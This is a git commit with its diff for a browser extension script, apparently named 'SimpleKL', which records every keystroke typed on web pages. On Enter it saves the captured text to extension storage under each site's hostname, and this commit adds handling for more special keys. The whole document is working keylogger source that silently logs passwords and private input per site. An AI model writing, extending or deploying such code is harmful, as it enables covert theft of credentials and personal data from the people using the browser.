4b7dcc574caf2dc5ed0321fc299dddc5b2df1969
Hebron George <hebrontgeorge@gmail.com>
2014-06-14 23:55:52 -0400

    Added many checks for more special characters. Now storing to local storage with the site name as the key, so retrieval will be based on site's hostname.

--- myscript.js
+++ myscript.js
@@ -1,13 +1,22 @@
-var input = '';
-var items = {}, i = 0;
+var input = '', key = location.hostname, items = {};
 $(document).keydown(function(e){ 
-  console.log(e.which);
   if (e.which == 13){
-    console.log(input);
-    items[i++] = input;
-    chrome.storage.local.set(items);
-    chrome.storage.local.get(null, function(result){console.log(result);});
-    input = '';
+    chrome.storage.local.get(key, function(result){
+      input += '\n';
+      if (result[key] === undefined){
+        items[key] = input;
+        chrome.storage.local.set(items, function(){
+          if (chrome.extension.lastError){
+            console.log('Error in SimpleKL set(): ' + chrome.extension.lastError.message);
+          }
+        });
+      }  else {
+        // Input from this site already exists in storage
+        items[key] = result[key] + input;
+        chrome.storage.local.set(items);
+      }
+      input = '';
+    });
   } else if (e.which === 9){
     input += '<tab>';
   } else if (e.which === 8){
@@ -18,6 +27,14 @@ $(document).keydown(function(e){
     input += '<ctrl>';
   } else if (e.which === 20){
     input += '<capslock>';
+  } else if (e.which === 188){
+    input += '<comma>';
+  } else if (e.which === 187){
+    input += '<equal>';
+  } else if (e.which === 186){
+    input += '<semicolon>';
+  } else if (e.which === 190){
+    input += '<period>';
   } else {
     input += String.fromCharCode(e.which);
   }
